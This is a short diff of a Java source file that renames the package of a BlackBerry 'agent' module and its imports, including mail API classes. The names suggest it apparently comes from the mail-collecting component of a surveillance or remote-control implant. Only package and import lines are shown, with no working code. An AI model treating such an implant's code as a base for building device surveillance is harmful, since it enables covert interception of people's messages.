@@ -1,19 +1,19 @@
 /**
  * 
  */
-package com.ht.rcs.blackberry.agent;
+package blackberry.agent;
 
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.util.Date;
 import java.util.Vector;
 
-import com.ht.rcs.blackberry.log.Markup;
-import com.ht.rcs.blackberry.utils.Check;
-import com.ht.rcs.blackberry.utils.DateTime;
-import com.ht.rcs.blackberry.utils.Debug;
-import com.ht.rcs.blackberry.utils.DebugLevel;
-import com.ht.rcs.blackberry.utils.Utils;
+import blackberry.log.Markup;
+import blackberry.utils.Check;
+import blackberry.utils.DateTime;
+import blackberry.utils.Debug;
+import blackberry.utils.DebugLevel;
+import blackberry.utils.Utils;
 
 import net.rim.blackberry.api.mail.Address;
 import net.rim.blackberry.api.mail.BodyPart;
